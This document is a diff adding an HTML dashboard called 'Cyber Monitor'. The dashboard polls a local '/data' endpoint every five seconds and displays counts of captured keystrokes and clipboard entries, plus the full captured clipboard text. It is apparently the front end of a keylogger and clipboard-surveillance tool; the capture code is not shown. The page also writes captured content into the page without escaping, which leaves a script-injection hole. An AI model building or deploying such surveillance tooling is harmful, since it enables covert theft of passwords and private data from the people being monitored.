@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Cyber Security Monitor</title>
+                        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+                        <style>
+                            * {
+                                margin: 0;
+                                padding: 0;
+                                box-sizing: border-box;
+                            }
+                            
+                            body {
+                                font-family: 'Exo 2', sans-serif;
+                                background: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80') no-repeat center center fixed;
+                                background-size: cover;
+                                color: #ffffff;
+                                min-height: 100vh;
+                                position: relative;
+                            }
+                            
+                            body::before {
+                                content: '';
+                                position: absolute;
+                                top: 0;
+                                left: 0;
+                                right: 0;
+                                bottom: 0;
+                                background: rgba(0, 0, 0, 0.7);
+                                z-index: 1;
+                            }
+                            
+                            .main-container {
+                                position: relative;
+                                z-index: 2;
+                                padding: 20px;
+                                min-height: 100vh;
+                            }
+                            
+                            .header {
+                                text-align: center;
+                                margin-bottom: 40px;
+                                padding: 30px;
+                                background: linear-gradient(135deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 255, 0.1));
+                                border-radius: 20px;
+                                border: 2px solid rgba(0, 255, 255, 0.3);
+                                backdrop-filter: blur(20px);
+                            }
+                            
+                            .title {
+                                font-family: 'Orbitron', monospace;
+                                font-size: 3.5em;
+                                font-weight: 900;
+                                background: linear-gradient(45deg, #00ffff, #ff00ff, #ffff00);
+                                background-size: 200% 200%;
+                                background-clip: text;
+                                -webkit-background-clip: text;
+                                -webkit-text-fill-color: transparent;
+                                animation: gradient 3s ease infinite;
+                                text-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+                                margin-bottom: 10px;
+                            }
+                            
+                            @keyframes gradient {
+                                0% { background-position: 0% 50%; }
+                                50% { background-position: 100% 50%; }
+                                100% { background-position: 0% 50%; }
+                            }
+                            
+                            .subtitle {
+                                font-size: 1.2em;
+                                color: #00ffff;
+                                font-weight: 300;
+                                letter-spacing: 2px;
+                            }
+                            
+                            .stats-container {
+                                display: grid;
+                                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                                gap: 25px;
+                                margin-bottom: 40px;
+                            }
+                            
+                            .stat-card {
+                                background: linear-gradient(135deg, rgba(0, 0, 0, 0.8), rgba(0, 255, 255, 0.1));
+                                border: 2px solid rgba(0, 255, 255, 0.3);
+                                border-radius: 20px;
+                                padding: 30px;
+                                text-align: center;
+                                backdrop-filter: blur(15px);
+                                transition: all 0.3s ease;
+                                position: relative;
+                                overflow: hidden;
+                            }
+                            
+                            .stat-card::before {
+                                content: '';
+                                position: absolute;
+                                top: 0;
+                                left: -100%;
+                                width: 100%;
+                                height: 100%;
+                                background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
+                                transition: left 0.5s;
+                            }
+                            
+                            .stat-card:hover::before {
+                                left: 100%;
+                            }
+                            
+                            .stat-card:hover {
+                                transform: translateY(-10px);
+                                border-color: rgba(0, 255, 255, 0.6);
+                                box-shadow: 0 20px 40px rgba(0, 255, 255, 0.3);
+                            }
+                            
+                            .stat-icon {
+                                font-size: 3em;
+                                margin-bottom: 15px;
+                                display: block;
+                            }
+                            
+                            .stat-number {
+                                font-family: 'Orbitron', monospace;
+                                font-size: 2.5em;
+                                font-weight: 700;
+                                color: #00ffff;
+                                margin-bottom: 10px;
+                                text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+                            }
+                            
+                            .stat-label {
+                                font-size: 1.1em;
+                                color: #ffffff;
+                                font-weight: 400;
+                                text-transform: uppercase;
+                                letter-spacing: 1px;
+                            }
+                            
+                            .clipboard-section {
+                                background: linear-gradient(135deg, rgba(0, 0, 0, 0.8), rgba(255, 0, 255, 0.1));
+                                border: 2px solid rgba(255, 0, 255, 0.3);
+                                border-radius: 20px;
+                                padding: 30px;
+                                margin-bottom: 30px;
+                                backdrop-filter: blur(15px);
+                            }
+                            
+                            .section-title {
+                                font-family: 'Orbitron', monospace;
+                                font-size: 2em;
+                                color: #ff00ff;
+                                margin-bottom: 25px;
+                                text-align: center;
+                                text-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
+                            }
+                            
+                            .clipboard-list {
+                                max-height: 500px;
+                                overflow-y: auto;
+                                padding-right: 10px;
+                            }
+                            
+                            .clipboard-item {
+                                background: linear-gradient(135deg, rgba(0, 0, 0, 0.6), rgba(0, 255, 255, 0.1));
+                                border: 1px solid rgba(0, 255, 255, 0.3);
+                                border-radius: 15px;
+                                padding: 20px;
+                                margin: 15px 0;
+                                transition: all 0.3s ease;
+                                position: relative;
+                            }
+                            
+                            .clipboard-item:hover {
+                                transform: scale(1.02);
+                                border-color: rgba(0, 255, 255, 0.6);
+                                box-shadow: 0 10px 25px rgba(0, 255, 255, 0.2);
+                            }
+                            
+                            .timestamp {
+                                color: #00ffff;
+                                font-size: 0.9em;
+                                margin-bottom: 10px;
+                                font-weight: 600;
+                                display: flex;
+                                align-items: center;
+                                gap: 8px;
+                            }
+                            
+                            .content {
+                                background: rgba(0, 0, 0, 0.4);
+                                border: 1px solid rgba(255, 255, 255, 0.1);
+                                border-radius: 10px;
+                                padding: 15px;
+                                font-family: 'Courier New', monospace;
+                                white-space: pre-wrap;
+                                word-break: break-all;
+                                color: #ffffff;
+                                font-size: 0.95em;
+                                line-height: 1.5;
+                            }
+                            
+                            .controls {
+                                text-align: center;
+                                padding: 30px;
+                                background: linear-gradient(135deg, rgba(0, 0, 0, 0.8), rgba(255, 255, 0, 0.1));
+                                border: 2px solid rgba(255, 255, 0, 0.3);
+                                border-radius: 20px;
+                                backdrop-filter: blur(15px);
+                            }
+                            
+                            .refresh-btn {
+                                background: linear-gradient(45deg, #00ffff, #ff00ff);
+                                color: #000;
+                                border: none;
+                                padding: 15px 30px;
+                                border-radius: 50px;
+                                cursor: pointer;
+                                font-family: 'Orbitron', monospace;
+                                font-size: 1.1em;
+                                font-weight: 700;
+                                margin: 20px 0;
+                                transition: all 0.3s ease;
+                                text-transform: uppercase;
+                                letter-spacing: 1px;
+                                box-shadow: 0 5px 15px rgba(0, 255, 255, 0.3);
+                            }
+                            
+                            .refresh-btn:hover {
+                                transform: translateY(-3px);
+                                box-shadow: 0 10px 25px rgba(0, 255, 255, 0.5);
+                                background: linear-gradient(45deg, #ff00ff, #00ffff);
+                            }
+                            
+                            .status-indicator {
+                                display: inline-block;
+                                width: 12px;
+                                height: 12px;
+                                background: #00ff00;
+                                border-radius: 50%;
+                                margin-right: 10px;
+                                animation: pulse 2s infinite;
+                            }
+                            
+                            @keyframes pulse {
+                                0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
+                                70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
+                                100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
+                            }
+                            
+                            .auto-refresh-info {
+                                color: #ffff00;
+                                font-size: 0.9em;
+                                margin-top: 15px;
+                                font-weight: 300;
+                            }
+                            
+                            ::-webkit-scrollbar {
+                                width: 8px;
+                            }
+                            
+                            ::-webkit-scrollbar-track {
+                                background: rgba(0, 0, 0, 0.3);
+                                border-radius: 10px;
+                            }
+                            
+                            ::-webkit-scrollbar-thumb {
+                                background: linear-gradient(45deg, #00ffff, #ff00ff);
+                                border-radius: 10px;
+                            }
+                            
+                            ::-webkit-scrollbar-thumb:hover {
+                                background: linear-gradient(45deg, #ff00ff, #00ffff);
+                            }
+                            
+                            @media (max-width: 768px) {
+                                .title {
+                                    font-size: 2.5em;
+                                }
+                                
+                                .stats-container {
+                                    grid-template-columns: 1fr;
+                                }
+                                
+                                .main-container {
+                                    padding: 10px;
+                                }
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="main-container">
+                            <div class="header">
+                                <h1 class="title">CYBER MONITOR</h1>
+                                <p class="subtitle">Real-time Security Surveillance Dashboard</p>
+                            </div>
+                            
+                            <div class="stats-container">
+                                <div class="stat-card">
+                                    <span class="stat-icon">⌨️</span>
+                                    <div class="stat-number" id="keystroke-count">0</div>
+                                    <div class="stat-label">Keystrokes Captured</div>
+                                </div>
+                                <div class="stat-card">
+                                    <span class="stat-icon">📋</span>
+                                    <div class="stat-number" id="clipboard-count">0</div>
+                                    <div class="stat-label">Clipboard Entries</div>
+                                </div>
+                                <div class="stat-card">
+                                    <span class="stat-icon">🔒</span>
+                                    <div class="stat-number" id="log-size">0</div>
+                                    <div class="stat-label">Log Size (KB)</div>
+                                </div>
+                            </div>
+                            
+                            <div class="clipboard-section">
+                                <h2 class="section-title">📋 CLIPBOARD SURVEILLANCE</h2>
+                                <div class="clipboard-list" id="clipboard-list">
+                                    <div style="text-align: center; color: #00ffff; padding: 40px;">
+                                        <div class="status-indicator"></div>
+                                        Loading surveillance data...
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="controls">
+                                <button class="refresh-btn" onclick="refreshData()">
+                                    🔄 REFRESH SURVEILLANCE DATA
+                                </button>
+                                <div class="auto-refresh-info">
+                                    <div class="status-indicator"></div>
+                                    Auto-refresh active • Monitoring every 5 seconds
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <script>
+                            function refreshData() {{
+                                fetch('/data')
+                                    .then(response => response.json())
+                                    .then(data => {{
+                                        document.getElementById('keystroke-count').textContent = data.keystrokes;
+                                        document.getElementById('clipboard-count').textContent = data.clipboard_captures;
+                                        
+                                        const clipboardList = document.getElementById('clipboard-list');
+                                        if (data.clipboard_history && data.clipboard_history.length > 0) {{
+                                            clipboardList.innerHTML = data.clipboard_history.map(item => `
+                                                <div class="clipboard-item">
+                                                    <div class="timestamp">
+                                                        <span class="status-indicator"></span>
+                                                        📅 ${new Date(item.timestamp).toLocaleString()}
+                                                    </div>
+                                                    <div class="content">${item.content}</div>
+                                                </div>
+                                            `).join('');
+                                        }} else {{
+                                            clipboardList.innerHTML = `
+                                                <div style="text-align: center; color: #00ffff; padding: 40px;">
+                                                    <div class="status-indicator"></div>
+                                                    No clipboard activity detected yet...
+                                                </div>
+                                            `;
+                                        }}
+                                    }})
+                                    .catch(error => {{
+                                        console.error('Error fetching data:', error);
+                                        document.getElementById('clipboard-list').innerHTML = `
+                                            <div style="text-align: center; color: #ff0000; padding: 40px;">
+                                                ❌ Error connecting to surveillance system
+                                            </div>
+                                        `;
+                                    }});
+                            }}
+                            
+                            // Auto-refresh every 5 seconds
+                            setInterval(refreshData, 5000);
+                            
+                            // Initial load
+                            refreshData();
+                            
+                            document.addEventListener('DOMContentLoaded', function() {{
+                                const cards = document.querySelectorAll('.stat-card');
+                                cards.forEach((card, index) => {{
+                                    card.style.animationDelay = `${index * 0.1}s`;
+                                }});
+                            }});
+                        </script>
+                    </body>
+                    </html>
